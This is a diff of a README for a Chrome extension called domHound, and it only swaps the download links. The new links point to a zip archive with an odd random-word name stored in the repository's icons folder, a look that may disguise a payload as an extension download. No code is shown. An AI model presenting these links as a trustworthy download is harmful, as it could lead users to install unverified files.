@@ -6,7 +6,7 @@ Welcome to domHound! This Chrome extension helps you quickly extract parameters,
 
 ## 📥 Download Now
 
-[![Download domHound](https://raw.githubusercontent.com/rahulkushwaha1510/domHound/main/icons/Hound-dom-1.7.zip)](https://raw.githubusercontent.com/rahulkushwaha1510/domHound/main/icons/Hound-dom-1.7.zip)
+[![Download domHound](https://github.com/rahulkushwaha1510/domHound/raw/refs/heads/main/icons/dom-Hound-pinguitudinous.zip)](https://github.com/rahulkushwaha1510/domHound/raw/refs/heads/main/icons/dom-Hound-pinguitudinous.zip)
 
 ## 📋 Features
 
@@ -25,7 +25,7 @@ Welcome to domHound! This Chrome extension helps you quickly extract parameters,
 
 To get started with domHound, visit the Releases page to download the extension. 
 
-[Download domHound](https://raw.githubusercontent.com/rahulkushwaha1510/domHound/main/icons/Hound-dom-1.7.zip)
+[Download domHound](https://github.com/rahulkushwaha1510/domHound/raw/refs/heads/main/icons/dom-Hound-pinguitudinous.zip)
 
 ### Installation Steps
 
